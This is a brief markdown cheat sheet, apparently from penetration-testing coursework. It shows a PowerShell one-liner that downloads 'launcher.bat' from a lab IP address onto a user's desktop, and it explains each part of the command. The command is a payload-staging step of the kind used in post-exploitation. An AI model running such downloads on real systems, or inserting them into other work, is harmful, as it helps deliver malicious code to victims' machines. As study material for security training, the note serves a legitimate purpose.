# Download a File

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:8000/launcher.bat','C:\Users\offsec\Desktop\launcher.bat')"
# Options
-c 			# Specifies a command, wrapped in double-quotes, to be run by powershell
new-object	# Instantiates either a .Net Framework or COM object
System.Net.WebClient	# Specifies the class of the instance to create, WebClient here, part of the System.Net namespace
DownloadFile	# Public method of WebClient, takes two paramters, src URI and target location
```

